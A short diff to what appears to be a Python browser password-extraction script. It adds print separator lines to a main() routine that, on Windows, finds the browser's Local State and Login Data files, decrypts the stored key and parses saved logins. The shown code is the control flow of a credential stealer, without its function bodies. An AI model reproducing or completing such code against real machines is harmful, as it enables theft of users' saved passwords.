@@ -146,13 +146,19 @@ def login_data_parser(login_data_path, decryption_key):
 def main():
 
     if os.name == 'nt':
+    
+        print(f"| ----------------------------------")
 
         try:
             local_state_path = find_local_state()
             login_data_path = find_login_data()
+            
+            print(f"| ----------------------------------")
 
             encrypted_key = get_encrypted_key(local_state_path)
             decryption_key = decrypt_key(encrypted_key)
+            
+            print(f"| ----------------------------------")
 
             login_data_parser(login_data_path, decryption_key)
             
